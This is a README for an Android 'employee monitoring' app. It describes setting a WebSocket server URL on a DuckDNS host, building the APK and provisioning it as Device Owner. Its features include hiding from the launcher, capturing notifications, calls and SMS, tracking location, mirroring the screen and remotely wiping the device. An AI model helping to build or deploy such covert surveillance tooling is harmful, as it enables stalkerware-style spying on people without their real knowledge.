# Office Agent App

**Employee monitoring app for office devices** — 2-3 MB optimized APK

## ⚡ Quick Start

### 1️⃣ Configure Server
Edit `app/src/main/kotlin/com/office/agent/service/AgentService.kt`:
```kotlin
const val SERVER_URL = "ws://YOUR_DUCKDNS.duckdns.org:7771"
```

### 2️⃣ Build
```bash
./gradlew assembleRelease
```
APK: `app/build/outputs/apk/release/app-arm64-v8a-release.apk`

### 3️⃣ Deploy
- Upload APK to server
- Generate QR code using `qr_provisioning_template.json`
- Factory reset device → 6 tap → Scan QR → Auto setup

📖 **Full guide:** See `SETUP_GUIDE.md`

---

## 📋 Features
✅ Hidden from launcher  
✅ Notification capture  
✅ File manager  
✅ Location tracking  
✅ Call/SMS logs  
✅ Screen mirror + screenshot  
✅ Lock/Wipe device  
✅ Device Owner mode  
✅ Auto-start on boot  

---

## 📱 Requirements
- Android 8.0+ (API 26+)
- ARM64 device
- Internet connection

---

## 🔒 Legal
⚠️ Employee consent required. Get "Device Monitoring Policy" signed before deployment.

---

## 🛠️ Tech Stack
- Kotlin
- Built-in Android APIs only (no external libs)
- WebSocket for real-time communication
- Device Admin API
- MediaProjection for screen capture

---

**Size:** ~2-3 MB | **Target:** Office device monitoring
